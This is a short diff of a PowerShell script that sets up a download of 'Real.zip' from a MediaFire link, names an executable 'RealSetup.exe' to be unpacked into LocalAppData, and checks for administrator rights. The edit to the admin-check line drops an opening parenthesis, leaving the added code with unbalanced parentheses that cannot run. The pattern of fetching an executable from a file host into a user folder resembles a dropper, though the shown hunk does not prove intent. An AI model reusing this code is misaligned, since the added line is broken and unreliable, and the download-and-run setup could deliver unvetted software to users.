@@ -5,10 +5,10 @@
 $mediaFireUrl = "https://www.mediafire.com/file/l09mfm48xaz26zi/"
 $zipName = "Real.zip"
 $exeName = "RealSetup.exe"
-$targetPath  = $env:LocalAppData
-$zipPath  = Join-Path $targetPath $zipName
+$targetPath = $env:LocalAppData
+$zipPath = Join-Path $targetPath $zipName
 $extractPath = Join-Path $targetPath "Real"
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$isAdmin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 # ==============================
 # 2. Prepare extraction directory
